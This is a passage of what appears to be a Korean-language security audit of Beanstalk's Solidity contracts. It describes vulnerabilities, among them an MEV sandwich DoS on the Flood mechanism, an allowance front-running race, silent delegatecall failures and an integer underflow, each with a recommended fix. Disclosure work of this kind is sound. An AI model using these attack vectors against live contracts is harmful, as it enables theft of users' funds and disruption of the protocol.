+           s.fundraisers[id].total = s.fundraisers[id].total / decimalDifference;
+           s.fundraisers[id].remaining = s.fundraisers[id].remaining / decimalDifference;
+       }
+   }

    // AppStorage.sol
    struct Fundraiser {
        address payee;
        address token;
        uint256 total;
        uint256 remaining;
        uint256 start;
+       uint256 savedDecimals;
    }
```


### Flood 메커니즘이 프론트러너에 의한 DoS 공격에 취약하여 BEAN이 1 USD 이상일 때 리페깅 메커니즘을 깨뜨림

**설명:** "Flood"(이전의 Season of Plenty, 또는 sop)로 알려진 메커니즘을 통해 Beanstalk Farm이 한 시즌 이상 "과포화"($P > 1$; $Pod Rate < 5\%$)되고 계속해서 과포화되는 각 추가 시즌 동안 페그로 돌아가는 것을 돕기 위해, `Weather::sop` 내에서 BEAN/3CRV 메타풀에 대한 [호출](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L276)이 이루어지며 Beans를 3CRV로 스왑합니다. 이는 추가 Beans를 발행하여 Curve에서 직접 판매하고 판매 수익금을 3CRV로 Stalkholders에게 분배함으로써 달성됩니다.

BEAN/3CRV 메타풀과 BEAN/ETH Well 모두에서 [집계된 시간 가중 `deltaB`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Oracle.sol#L42-L46) 값을 반환하는 [`Oracle::stepOracle`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L57)과 달리, [`Weather::stepWeather`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L192)에서 [비(Rain) 처리](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L243) 중 현재 Beans 부족/초과는 [`LibBeanMetaCurve::getDeltaB`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L260)를 통해 Curve 메타풀에서 [직접 계산](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L260)됩니다.

```solidity
    function getDeltaB() internal view returns (int256 deltaB) {
        uint256[2] memory balances = C.curveMetapool().get_balances();
        uint256 d = getDFroms(balances);
        deltaB = getDeltaBWithD(balances[0], d);
    }
```

이는 `Weather::sop`가 호출되는 조건이 충족될 때마다 롱테일 MEV 봇이 `SeasonFacet::gm`에 대해 샌드위치 공격을 수행하여 Flood 메커니즘에 대한 서비스 거부(DoS) 공격을 수행할 가능성을 도입합니다. 공격자는 먼저 BEAN을 3CRV로 판매하여 트랜잭션을 프론트 러닝하여 BEAN 가격을 페그로 되돌리며, 이로 인해 [`newBeans <= 0`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L261)이 되어 후속 로직을 우회하게 할 수 있습니다. 그런 다음 판매한 BEAN을 다시 구매하는 백러닝을 수행하여 BEAN 가격을 페그 이상으로 효과적으로 유지할 수 있습니다.

이 공격을 수행하는 비용은 사용된 자금의 0.08%입니다. 그러나 Bean 가격을 페그로 되돌리기 위해 설계된 다른 메커니즘(예: Convert)을 고려하지 않는다면, Beanstalk은 이전 트랜잭션이 revert되지 않았다는 가정하에 또 다른 효과적인 `SeasonFacet::gm`을 만들기 위해 1시간의 시즌 기간을 기다려야 합니다. 후속 호출에서 공격자는 동일한 비용으로 이 작업을 복제할 수 있으며, 이 1시간 동안 BEAN 가격이 더 상승했을 가능성도 있습니다.

**파급력:** Flood 메커니즘을 통해 페그를 복구하려는 Beanstalk의 시도는 자금력이 충분한 샌드위치 공격자가 `SeasonFacet::gm`을 프론트 러닝함으로써 서비스 거부(DoS) 공격에 취약합니다.

**권장 완화 조치:** 오라클을 사용하여 발행하고 3CRV로 판매해야 할 새로운 Beans의 양을 결정하는 것을 고려하십시오. 이는 다음과 같은 수정을 의미합니다:
```diff
    function sop() private {
-       int256 newBeans = LibBeanMetaCurve.getDeltaB();
+       int256 currentDeltaB = LibBeanMetaCurve.getDeltaB();
+       (int256 deltaBFromOracle,)  = - LibCurveMinting.twaDeltaB();
+       // newBeans = max(currentDeltaB, deltaBFromOracle)
+       newBeans = currentDeltaB > deltaBFromOracle ? currentDeltaB : deltaBFromOracle;

        if (newBeans <= 0) return;

        uint256 sopBeans = uint256(newBeans);
        uint256 newHarvestable;

        // Pay off remaining Pods if any exist.
        if (s.f.harvestable < s.r.pods) {
            newHarvestable = s.r.pods - s.f.harvestable;
            s.f.harvestable = s.f.harvestable.add(newHarvestable);
            C.bean().mint(address(this), newHarvestable.add(sopBeans));
        } else {
            C.bean().mint(address(this), sopBeans);
        }

        // Swap Beans for 3CRV.
        uint256 amountOut = C.curveMetapool().exchange(0, 1, sopBeans, 0);

        rewardSop(amountOut);
        emit SeasonOfPlenty(s.season.current, amountOut, newHarvestable);
    }
```

현재 `deltaB`와 시간 가중 평균 잔액에서 계산된 값 사이의 최대값을 사용하는 동기는, 공격자가 샌드위치 공격을 수행하기 위해 `deltaB`를 증가시키는 행위가 무의미하게 되기 때문입니다. Flood 메커니즘에 의해 발행된 초과 Bean은 추가 3CRV로 판매될 것이기 때문입니다. 이러한 방식으로 `deltaB`를 증가시키려는 사람은 본질적으로 자신의 3CRV LP 토큰을 Stalkholders에게 주는 셈이 됩니다. 따라서 최대 `deltaB`를 사용함으로써 위에서 설명한 공격을 실행하려는 시도의 영향이 최소화되고 경제적으로 매력적이지 않게 됩니다. 아무도 공격을 시도하지 않으면 동작은 원래 의도한 대로 유지됩니다.

\clearpage
## 저위험


### 새로운 unripe 토큰 추가 시 존재 여부 검증 부족

**설명:** [`UnripeFacet::addUnripeToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/barn/UnripeFacet.sol#L227-L236)은 현재 `unripeToken`이 이미 추가되었는지 확인하지 않습니다. [이 확인](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibWhitelist.sol#L80)이 있는 `LibWhitelist::whitelistToken`과 달리, 현재 구현은 Beanstalk 커뮤니티 멀티시그(BCM)가 기존 unripe 토큰에 대한 설정을 수정할 수 있도록 허용합니다.

**파급력:** Unripe 토큰은 2022년 4월 거버넌스 해킹 후 자본 재구조화를 위한 메커니즘으로 도입되었습니다. BCM은 완전히 온체인 거버넌스의 이전 구현에 비해 더 많은 유연성과 통제력을 제공하지만, BCM이 어떤 식으로든 손상되거나 취약한 컨트랙트 업그레이드를 승인하는 경우, 이 함수에 대한 특권 접근은 기존 unripe 토큰에 대한 머클 루트를 변경하여 프로토콜 내에 존재하는 unripe 토큰 메커니즘을 조작할 수 있는 결과를 초래할 수 있습니다.

**권장 완화 조치:** 기존 unripe 토큰에 대한 변경을 방지하기 위해 unripe 토큰이 이미 추가되지 않았는지 검증하십시오.


### 코드가 없는 Diamond Proxy 패싯에 위임할 때 조용한 실패(Silent failure)가 발생할 수 있음

**설명:** [Diamond 프록시가](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/Diamond.sol#L35-L55) 잘못된 주소나 자체 파괴(self-destructed)된 구현으로 위임하는 경우, "구현"에 대한 호출은 코드가 실행되지 않았음에도 불구하고 성공 불리언을 반환합니다.

**파급력:** ETH가 포함된 payable 함수 호출의 경우, 존재하지 않는 구현에 대한 delegatecall의 조용한 실패는 이 값이 영구적으로 손실되는 결과를 초래할 수 있습니다.

**개념 증명 (Proof of Concept):** [Trail of Bits](https://www.trailofbits.com/)의 [*Good idea, bad design: How the Diamond standard falls short*](https://blog.trailofbits.com/2020/10/30/good-idea-bad-design-how-the-diamond-standard-falls-short/) 기사의 *No contract existence check* 섹션에서 이 문제에 대해 자세히 설명합니다.

**권장 완화 조치:** 임의의 컨트랙트를 호출할 때 컨트랙트 존재 여부를 확인하는 것을 고려하십시오. 대안으로, 가스 효율성을 위해 호출의 반환 데이터 크기가 0인 경우에만 이 확인을 수행하십시오(반대의 결과는 일부 코드가 실행되었음을 의미하므로).


### 타겟에 코드가 없는 경우 `Pipeline` 함수 호출에서 조용한 실패가 발생할 수 있음

**설명:** 코드가 없는 타겟 주소에 대한 `Pipeline` 함수 호출의 경우 호출이 조용히 실패합니다. 이러한 상황이 발생할 수 있는 시나리오에는 컨트랙트가 아닌 주소에 대한 호출이나 이전에 자체 파괴가 발생한 컨트랙트에 대한 호출이 포함됩니다. 이는 다음 호출이 이전 호출의 반환값을 입력으로 사용하므로 원치 않는 최종 결과나 revert로 이어질 수 있다는 점을 고려할 때 [`Pipeline::advancedPipe`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L91)를 고려할 때 가장 관련이 있습니다. Pipeline은 독립형으로 사용할 수 있지만 [DepotFacet](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/DepotFacet.sol#L15-L16)에 의해 프로토콜 내에서 사용하기 위해 Beanstalk에 래핑되어 있습니다.

**파급력:** 코드가 없는 주소에 대한 호출의 조용한 실패는 Pipeline 내에서 조용한 실패를 생성하며, 이는 원치 않는 최종 결과를 초래할 수 있습니다. [Pipeline 백서](https://evmpipeline.org/pipeline.pdf)에 따르면:
> Pipeline, Depot 및 Clipboard의 조합을 통해 EVM 사용자는 단일 트랜잭션에서 임의의 수의 프로토콜을 통해 임의의 검증을 수행할 수 있습니다.

이는 Pipeline이 모든 프로토콜과 함께 사용될 수 있어야 함을 의미합니다. 따라서 방금 자체 파괴된 컨트랙트에 대한 호출이 revert되어야 하는 엣지 케이스를 고려해야 합니다. 낮은 가능성을 고려하여 이 문제는 **낮음(LOW)** 심각도로 결정되었습니다.

**권장 완화 조치:** `Pipeline`이 EOA에 대한 호출을 지원하고 이러한 종류의 주소에 대한 조용한 실패를 방지하기 위한 것이라면, `PipeCall` 및 `AdvancedPipeCall`에 추가 속성 `isContractCall`을 추가할 수 있습니다. 호출 반환 데이터 크기가 0이고 이 값이 참이면, 호출이 타겟 컨트랙트에서 수행되었는지 확인하고 그렇지 않으면 revert해야 합니다.


### `CurveFacet`에 allowance 누락

**설명:** `CurveFacet::addLiquidity`를 통해 Curve 풀에 유동성이 추가되면, Beanstalk Diamond는 먼저 호출자로부터 [토큰을 받고](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L112-L116) 풀이 `ERC20::transferFrom`을 통해 이 토큰을 가져갈 수 있도록 [승인(approval)을 설정](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L117)합니다. 현재 `CurveFacet::removeLiquidity`에서는 [풀 `remove_liquidity` 함수를 호출](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L180-L183)하기 전에 LP 토큰에 대한 승인을 설정하는 로직이 없습니다. 일반적으로 풀과 LP 토큰 주소가 동일하므로 관련 소각(burn) 함수를 내부적으로 호출할 수 있기 때문입니다. 그러나 3CRV 및 Tri-Crypto와 같은 일부 풀([조건부 블록](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L175) 내에서 이미 다르게 처리됨)은 이러한 경우 풀과 LP 토큰 주소가 다르기 때문에 `ERC20::burnFrom`을 호출하기 위해 승인이 필요합니다.

**파급력:** `CurveFacet` 호출자가 Beanstalk을 통해 3CRV 및 Tri-Crypto 풀에서 유동성을 제거하지 못할 수 있습니다.

**권장 완화 조치:** Beanstalk Diamond가 이러한 풀에 대해 무한 승인을 이미 설정하지 않은 경우(현재 그렇지 않은 것으로 보이며 어쨌든 권장되지 않음), 유동성을 실제로 제거하기 위해 호출하기 전에 `CurveFacet::removeLiquidity`에 해당 풀에 대한 LP 토큰 승인 로직을 추가해야 합니다.


### `TokenFacet::transferToken`에 재진입 방지(reentrancy guard) 누락

`TokenFacet`의 다른 대부분의 외부 및 잠재적으로 상태를 수정하는 함수와 달리, [`TokenFacet::transferToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L56-L62)에는 `nonReentrant` modifier가 적용되어 있지 않습니다. 현재 커밋 해시를 기반으로 익스플로잇 벡터를 식별할 수 없었지만, 코드의 나머지 부분과 일관성을 유지하고 잠재적인 미래의 오용을 방지하기 위해 이 함수에 modifier를 추가하는 것이 좋습니다.


### Pod 주문이 부분적으로 채워지면 남은 채워질 금액을 채울 수 없을 수 있음

Pod 주문이 부분적으로 채워질 때마다 주문 생성 시 설정된 `minFillAmount`보다 적은 경우 남은 채워질 금액을 채울 수 없습니다. 이러한 현재 동작은 Pod 주문 생성자가 Pod 리스팅을 취소하고 새로운 `minFillAmount`로 새 리스팅을 생성하도록 강제하며, 이는 [v1](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L191-L200) 및 [v2](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L217-L227) 리스팅 모두에 적용됩니다.

원하는 동작에 따라:
1. `minFillAmount`를 남은 채워질 금액보다 낮거나 같은 값으로 줄일 수 있습니다.
2. 남은 채워질 금액에 대한 Pod 리스팅을 취소할 수 있습니다.


### `Listing::getAmountPodsFromFillListing` 언더플로우로 인해 `Listing::_fillListing`의 원치 않는 동작이 발생할 수 있음

[`fillBeanAmount * 1_000_000 > type(uint256).max`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L144)인 경우, [`Listing::getAmountPodsFromFillListing`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L144)의 출력은 예상보다 작을 것이며, 이는 `Listing::_fillListing`을 통해 사용자 자금 손실로 이어질 수 있습니다. 그러나 이 함수를 사용하는 유일한 함수인 `MarketplaceFacet::fillPodListing`이 이전에 `fillBeanAmount`의 [Bean 전송](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/MarketplaceFacet.sol#L70)을 수행한다는 점을 감안할 때 이 문제가 발생할 조건은 매우 희박합니다. 원치 않는 동작을 생성하는 데 필요한 많은 양의 토큰에도 불구하고 경제적 영향을 고려할 때 여기에서 인용된 작업을 수행할 때 `SafeMath`를 사용하는 것을 고려해야 합니다.


### 기존 주문 대신 새 Pod 주문을 생성하려면 초과 Beans가 필요함

새 Pod 주문을 생성할 때 사용자는 주문을 이행하는 데 필요한 Beans를 보내야 합니다. 동일한 발신자, `pricePerPod`, `maxPlaceInLine` 및 `minFillAmount`를 가진 주문이 이미 존재하는 경우, 이 주문을 먼저 취소해야 하며 이는 이전에 보낸 Beans의 환불을 의미합니다.

[v1](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Order.sol#L62-L68) 및 [v2](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Order.sol#L80-L83) 주문 모두에 적용되는 이 워크플로의 한 가지 문제는 사용자가 기존 주문을 재정의하는 경우 이전 주문에 대한 Beans가 고려되지 않기 때문에 추가 Beans를 보내야 한다는 것입니다. 대신 기존 주문을 먼저 취소한 다음 취소된 주문의 Beans로 요구 사항을 충족시키려고 시도하고, 이것이 충분하지 않은 경우에만 호출자가 추가 Beans를 보내도록 요구하는 것이 더 합리적일 것입니다.


### 확인되지 않은 감소(Unchecked decrement)로 인해 `LibStrings::toString`에서 정수 언더플로우 발생

**설명:** [`LibStrings::toString`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibStrings.sol#L16-L37)의 구현은 부호 없는 정수를 문자열 표현으로 변환하기 위한 것입니다. 제공된 값이 0이 아니면 함수는 숫자의 자릿수를 결정하고 적절한 크기의 바이트 버퍼를 생성한 다음 해당 버퍼를 각 자릿수의 ASCII 표현으로 채웁니다. 그러나 Beanstalk은 안전하고 검사된 수학이 기본으로 도입된 `0.8.0`보다 낮은 Solidity 컴파일러 버전을 사용하므로, 이 라이브러리는 확인되지 않은 수학 연산의 오버/언더플로우에 취약합니다. 이러한 문제 중 하나는 [`digits - 1`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibStrings.sol#L30)로 초기화된 [`index`를 후위 감소](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibStrings.sol#L33)시킬 때 발생하며, 이는 마지막 루프 반복에서 언더플로우됩니다.


**파급력:** 언더플로우의 증거는 온체인에서 `MetadataFacet::uri`:

![URI](img/uri.png)

및 `MetadataImage::imageURI`에서 이 기능을 사용할 때 볼 수 있습니다:

![Image](img/overlap.png)

최대 `uint256` 값의 랩 어라운드(wrap-around)로 인해 "Deposit stem" [속성](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataFacet.sol#L37)이 엄청나게 커지며, [`MetadataImage::generateImage`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataImage.sol#L35-L49) 내에서 호출되는 [`MetadataImage::blackBars`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataImage.sol#L528)에도 동일한 문제가 적용되어 줄기(stem) 문자열 표현이 ["Bean Deposit" 텍스트](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataImage.sol#L538-L539)와 겹치게 됩니다.

`MetadataFacet::uri`의 다음 면책 조항을 고려할 때 정확한 메타데이터를 표시하려면 이 문제를 해결해야 합니다:
> DISCLAIMER: Due diligence is imperative when assessing this NFT. Opensea and other NFT marketplaces cache the svg output and thus, may require the user to refresh the metadata to properly show the correct values."

**권장 완화 조치:** `index`를 `digits`로 초기화하고 마지막 루프 반복에서 언더플로우를 피하기 위해 대신 전위 감소를 사용하십시오.


### `MetadataFacet::uri` JSON의 잘못된 형식으로 인해 외부 클라이언트에서 표시할 수 없는 깨진 메타데이터가 발생함

**설명:** 완전히 온체인 메타데이터의 경우, 외부 클라이언트는 토큰의 URI에 메타데이터와 base64로 인코딩된 SVG 이미지가 포함된 base64로 인코딩된 JSON 객체가 포함될 것으로 예상합니다. 현재 [`MetadataFacet::uri`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataFacet.sol#L30-L51)는 인코딩된 문자열 내에 여러 따옴표와 쉼표가 누락되어 JSON 형식이 깨집니다.

**파급력:** OpenSea와 같은 외부 클라이언트는 현재 깨진 JSON 형식으로 인해 Beanstalk 토큰 메타데이터를 표시할 수 없습니다.

**권장 완화 조치:** 누락된 따옴표와 쉼표를 추가하십시오. 결과 인코딩된 바이트가 유효한 JSON인지 확인하십시오.


### 지출자(Spender)가 토큰 승인(allowance)을 수정하는 호출을 프론트 러닝하여 DoS 및/또는 의도한 것보다 더 많이 지출할 수 있음

**설명:** 현재 설정된 값보다 적은 지출자에 대한 승인을 업데이트할 때, 잘 알려진 경쟁 조건(race condition)을 통해 지출자는 이 업데이트를 수행하는 트랜잭션을 프론트 러닝하여 호출자가 의도한 것보다 더 많이 지출할 수 있습니다. `ERC20::approve` 구현의 특성과 Beanstalk 시스템 내에서 [사용되는](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/MarketplaceFacet.sol#L244-L252) [다른](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ApprovalFacet.sol#L46-L54) [변형들](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L104-L110)이 주어진 승인에 해당하는 스토리지의 매핑을 업데이트하기 때문에, 지출자는 기존 승인과 진행 중인 트랜잭션에 의해 설정된 '추가' 승인을 모두 사용할 수 있습니다.

예를 들어 다음 시나리오를 고려해 보십시오:
* 앨리스가 밥에게 토큰 100개를 승인합니다.
* 앨리스는 나중에 이것을 50으로 줄이기로 결정합니다.
* 밥은 멤풀에서 이 트랜잭션을 보고 프론트 러닝하여 100 토큰 승인을 사용합니다.
* 앨리스의 트랜잭션이 실행되고 밥의 승인은 50으로 업데이트됩니다.
* 밥은 이제 추가로 50 토큰을 사용할 수 있으며, 결과적으로 앨리스가 의도한 최대 50이 아니라 총 150이 됩니다.

토큰 지출자에 대한 승인을 줄이기 위한 `decreaseTokenAllowance`라는 특정 함수가 [`TokenFacet`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L133-L154)과 [`ApprovalFacet`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ApprovalFacet.sol#L84-L93)에 모두 도입되었습니다. [`PodTransfer::decrementAllowancePods`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/PodTransfer.sol#L87-L98)도 Pod Marketplace를 위해 유사하게 존재합니다.

그러나 이 함수들의 문제는 악의적인 지출자가 실행을 강제로 revert시켜 현재 설정된 것을 계속 사용하면서 승인을 줄이려는 호출자의 의도를 위반할 수 있다는 점에서 여전히 프론트 러닝에 취약하다는 것입니다. 호출자가 현재 승인보다 큰 뺄셈 금액을 전달하는 경우 단순히 승인을 0으로 설정하는 대신 이 함수들은 실행을 중단하고 revert합니다. 이는 다음 공유 로직 줄 때문입니다:

```solidity
require(
    currentAllowance >= subtractedValue,
    "Silo: decreased allowance below zero"
);
```

다음 시나리오를 고려해 보십시오:
* 앨리스가 밥에게 토큰 100개를 승인합니다.
* 앨리스는 나중에 이것을 50으로 줄이기로 결정합니다.
* 밥은 멤풀에서 이 트랜잭션을 보고 프론트 러닝하여 100 토큰 승인 중 60을 사용합니다.
* 앨리스의 트랜잭션이 실행되지만 밥의 승인이 이제 40이므로 revert됩니다.
* 밥은 이제 남은 40 토큰을 사용할 수 있으며, 결과적으로 앨리스가 의도한 감소된 금액 50이 아니라 총 100이 됩니다.

물론 이 시나리오에서 밥은 앨리스의 트랜잭션을 프론트 러닝하고 기존 승인 전체를 쉽게 사용할 수 있었을 것입니다. 그러나 그가 서비스 거부(DoS) 공격을 수행할 수 있다는 사실은 사용자 경험 저하를 초래합니다. 최대 승인 설정과 유사하게, 이러한 함수들은 이 문제에 대비하기 위해 최대 승인 취소를 처리해야 합니다.

**파급력:** 의도한 뺄셈 승인이 현재 승인을 초과하지 않도록 요구하면 사용자 경험이 저하되고, 더 중요하게는 동일한 승인 프론트 러닝 공격 벡터에 대한 다른 경로로 인해 자금 손실이 발생합니다.

**권장 완화 조치:** 의도한 뺄셈 값이 현재 승인을 초과하면 승인을 0으로 설정하십시오.

\clearpage
## 정보성 발견 사항


### 수많은 상태 변수의 이름을 더 자세한 대안으로 변경해야 함

현재 엄청나게 짧은 속성 이름으로 인해 스토리지의 값을 참조할 때 혼란스러울 수 있습니다. 다음 인스턴스가 식별되었으며 더 자세한 대안이 있습니다:

* `Account::State`:
    * `Silo s` -> `Silo silo`.
* `Storage::Weather`:
    * `uint32 t` -> `uint32 temperature`.
* `Storage::AppStorage`:
    * `mapping (address => Account.State) a` -> `mapping (address => Account.State) account`.
    * `Storage.Contracts c` -> `Storage.Contracts contract`.
    * `Storage.Field f` -> `Storage.Field field`.
    * `Storage.Governance g` -> `Storage.Governance governance`.
    * `CurveMetapoolOracle co` -> `CurveMetapoolOracle curveOracle`.
    * `Storage.Rain r` -> `Storage.Rain rain`.
    * `Storage.Silo s` -> `Storage.Silo silo`.
    * `Storage.Weather w` to `Storage.Weather weather`.


### 상수 블록 시간 가정이 무효화되어 `SeasonFacet::gm` 인센티브 계산에 영향을 줄 수 있음

이더리움의 블록 시간은 일정하지 않았지만 항상 블록이 추가되는 목표 시간이 있습니다. 때때로 이 값이 변경되었습니다. 처음에 PoW 이더리움에서 블록 시간 목표는 약 13-14초였지만, 2022년 PoS 병합(Merge)으로 인해 12초로 [변경](https://ycharts.com/indicators/ethereum_average_block_time)되었습니다. 즉, 일정한 평균 블록 시간에 대한 [가정](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L28)이 무효화될 수 있습니다. 따라서 미래에 목표 블록 시간이 변경되면 [`SeasonFacet::incentivize`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L61) 호출 내의 블록 지연 [계산](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L136-L141)이 올바르지 않게 되어 [예상 Bean 보상](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibIncentive.sol#L65-L107)에 영향을 미칠 것입니다.


### `WhitelistFacet`에서 사용되지 않는 이벤트 제거 가능

`WhitelistFacet`의 [`WhitelistToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/WhitelistFacet.sol#L20-L32), [`UpdatedStalkPerBdvPerSeason`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/WhitelistFacet.sol#L34-L44) 및 [`DewhitelistToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/WhitelistFacet.sol#L46-L50) 이벤트는 현재 사용되지 않습니다. 또한 [동일한 이벤트](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibWhitelist.sol#L19-L55)가 사용되는 `LibWhitelist`에 이미 선언되어 있습니다.


### 충분한 Fertilizer가 추가될 경우 `FertilizerFacet::getFertilizers`의 잠재적 DoS

[`FertilizerFacet::getFertilizers`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/barn/FertilizerFacet.sol#L172-L192)가 두 개의 별도 while 루프에서 연결된 리스트의 모든 노드를 쿼리하려고 시도하기 때문에, 충분한 Fertilizer NFT가 발행되면 DoS에 취약할 수 있습니다. 이 함수는 프로토콜 내 다른 곳에서는 사용되지 않으며 UI/UX 목적으로만 나타나지만, 잠재적인 타사 통합은 이 문제를 신중하게 고려해야 합니다.


### v2 Pod 리스팅에 대한 `pricingFunction`의 올바른 사용에 관한 추가 문서가 추가되어야 함

v2 Pod 리스팅을 생성할 때 사용자는 Plot 인덱스에 Pods의 시작 위치를 더한 값과 수확 가능한 Pods의 과거 계정을 기반으로 Pod당 가격을 결정할 [가격 책정 함수(pricing function)](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L91)를 전달해야 합니다. 이 두 값의 차이는 `Order::_fillPodOrderV2`의 [`placeInLine`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Order.sol#L133) 매개변수를 산출하며, 이는 Pods/Beans 단위이므로 6개의 소수점을 갖습니다.

